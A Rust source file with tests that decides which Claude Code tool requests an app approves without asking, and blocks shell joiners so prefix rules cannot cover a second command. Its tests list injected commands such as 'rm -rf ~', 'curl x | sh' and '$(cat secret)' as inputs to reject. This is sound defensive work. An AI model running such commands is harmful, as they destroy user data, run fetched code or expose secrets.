//! What the assistant may do without asking.
//!
//! Claude Code applies the user's own permission rules first and only then
//! asks the app. Of what reaches the app, two things are let through: work on
//! files inside the open project, and anything a rule the user gave covers.
//! Everything else waits for an answer on screen.

use std::path::{Component, Path, PathBuf};

use serde_json::Value;

use super::{PermissionRequest, Rule};

/// Tools that read or write the one file or folder they are given.
const FILE_TOOLS: [&str; 7] = ["Read", "Edit", "Write", "MultiEdit", "NotebookEdit", "Glob", "Grep"];
/// In a shell command, any of these can start a second command, so a rule
/// for how a command begins says nothing about the rest of it.
const SHELL_JOINERS: [&str; 9] = [";", "&", "|", "`", "$(", ">", "<", "\n", "\r"];

pub fn allowed(request: &PermissionRequest, project: &Path, rules: &[Rule]) -> bool {
    inside_project(request, project) || rules.iter().any(|rule| covers(rule, request))
}

fn inside_project(request: &PermissionRequest, project: &Path) -> bool {
    if !FILE_TOOLS.contains(&request.tool.as_str()) {
        return false;
    }
    ["file_path", "notebook_path", "path"]
        .iter()
        .find_map(|key| request.input[*key].as_str())
        .is_some_and(|path| is_within(Path::new(path), project))
}

/// True when `path` names something in `folder`, judged by the names alone:
/// `..` is followed, links are not.
fn is_within(path: &Path, folder: &Path) -> bool {
    if !path.is_absolute() {
        return false;
    }
    let mut resolved = PathBuf::new();
    for part in path.components() {
        match part {
            Component::ParentDir => {
                resolved.pop();
            }
            Component::CurDir => {}
            other => resolved.push(other),
        }
    }
    resolved.starts_with(folder)
}

fn covers(rule: &Rule, request: &PermissionRequest) -> bool {
    if rule.tool != request.tool {
        return false;
    }
    if rule.tool != "Bash" {
        return rule.content.is_empty() || rule.content == request.detail;
    }
    let command = command_of(&request.input);
    // Claude Code writes "starts with" as `npm run *` or, in older rules, `npm run:*`.
    let start = rule.content.strip_suffix(" *").or_else(|| rule.content.strip_suffix(":*"));
    match start {
        None => command == rule.content,
        Some(start) => {
            let begins = command == start || command.strip_prefix(start).is_some_and(|rest| rest.starts_with(' '));
            begins && !SHELL_JOINERS.iter().any(|joiner| command.contains(joiner))
        }
    }
}

fn command_of(input: &Value) -> &str {
    input["command"].as_str().unwrap_or("").trim()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn request(tool: &str, input: Value) -> PermissionRequest {
        let detail = input["command"].as_str().or(input["url"].as_str()).unwrap_or("").to_owned();
        PermissionRequest { request_id: "r".into(), tool: tool.into(), input, detail, rule: None }
    }

    fn rule(tool: &str, content: &str) -> Rule {
        Rule { tool: tool.into(), content: content.into() }
    }

    #[test]
    fn files_in_the_project_need_no_answer() {
        let project = Path::new("/Users/me/film");
        for tool in ["Write", "Edit", "Read"] {
            let inside = request(tool, json!({ "file_path": "/Users/me/film/assets/a.html" }));
            assert!(allowed(&inside, project, &[]), "{tool}");
        }
        assert!(allowed(&request("Grep", json!({ "path": "/Users/me/film" })), project, &[]));
    }

    #[test]
    fn files_elsewhere_do() {
        let project = Path::new("/Users/me/film");
        for path in ["/Users/me/other/a.html", "/Users/me/film/../.zshrc", "/Users/me/film-2/a.html", "a.html"] {
            assert!(!allowed(&request("Write", json!({ "file_path": path })), project, &[]), "{path}");
        }
    }

    #[test]
    fn a_shell_command_is_never_let_through_for_being_in_the_project() {
        let project = Path::new("/Users/me/film");
        let command = request("Bash", json!({ "command": "rm -rf /Users/me/film/assets" }));
        assert!(!allowed(&command, project, &[]));
    }

    #[test]
    fn a_rule_covers_the_same_command_or_ones_that_start_the_same() {
        let project = Path::new("/p");
        let exact = [rule("Bash", "node tool.mjs check")];
        assert!(allowed(&request("Bash", json!({ "command": "node tool.mjs check" })), project, &exact));
        assert!(!allowed(&request("Bash", json!({ "command": "node tool.mjs render" })), project, &exact));

        let start = [rule("Bash", "node tool.mjs:*")];
        assert!(allowed(&request("Bash", json!({ "command": "node tool.mjs" })), project, &start));
        assert!(allowed(&request("Bash", json!({ "command": "node tool.mjs lint --json" })), project, &start));
        assert!(!allowed(&request("Bash", json!({ "command": "node tool.mjsx" })), project, &start));

        let spaced = [rule("Bash", "npm run *")];
        assert!(allowed(&request("Bash", json!({ "command": "npm run check" })), project, &spaced));
        assert!(!allowed(&request("Bash", json!({ "command": "npm install x" })), project, &spaced));
        assert!(!allowed(&request("Bash", json!({ "command": "npm run check && rm -rf ~" })), project, &spaced));
    }

    #[test]
    fn a_rule_for_how_a_command_starts_does_not_cover_a_second_command() {
        let project = Path::new("/p");
        let start = [rule("Bash", "node tool.mjs:*")];
        for command in [
            "node tool.mjs lint; rm -rf ~",
            "node tool.mjs lint && curl x | sh",
            "node tool.mjs $(cat secret)",
            "node tool.mjs > ~/.zshrc",
            "node tool.mjs\nrm -rf ~",
        ] {
            assert!(!allowed(&request("Bash", json!({ "command": command })), project, &start), "{command}");
        }
    }

    #[test]
    fn rules_are_per_tool() {
        let project = Path::new("/p");
        let rules = [rule("WebFetch", ""), rule("Bash", "ls")];
        assert!(allowed(&request("WebFetch", json!({ "url": "https://example.com" })), project, &rules));
        assert!(!allowed(&request("WebSearch", json!({ "query": "x" })), project, &rules));
    }
}
